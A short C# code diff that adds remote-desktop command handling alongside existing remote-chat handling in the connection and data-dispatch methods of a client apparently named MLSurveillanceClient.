@@ -13,6 +13,7 @@ namespace MLSurveillanceClient
         public void OnConnect(IClientConnection server)
         {
             RemoteChatHandler.SetNetworkHost(server);
+            RemoteDesktopHandler.SetNetworkHost(server);
         }
 
         public void OnDataRecieved(object[] data)
@@ -20,7 +21,8 @@ namespace MLSurveillanceClient
             NetworkCommand command = (NetworkCommand)data[0];
             if(command == NetworkCommand.RemoteChat)
                 RemoteChatHandler.Handle(data);
-
+            if (command == NetworkCommand.RemoteDesktop)
+                RemoteDesktopHandler.Handle(data);
         }
 
         public void OnDisconnect()
